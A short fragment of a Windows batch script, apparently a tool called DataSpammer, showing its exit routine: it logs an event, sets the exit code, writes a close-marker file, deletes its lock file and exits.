    EVENTCREATE /T INFORMATION /ID 200 /L APPLICATION /SO DataSpammer /D "DataSpammer Exiting %ERRORLEVEL%"
    set EXIT_CODE=%ERRORLEVEL%
    if not "%~1"=="" set "EXIT_CODE=%~1"
    if "%EXIT_CODE%"=="" set EXIT_CODE=0
    if "%OS%"=="Windows_NT" endlocal
    echo: > %temp%\DataSpammerClose.txt
    erase "%~dp0\dataspammer.lock" >nul 2>&1
    popd
    exit %b.flag%%EXIT_CODE%

goto cancel
exit %errorlevel%

:: Leave empty line below 
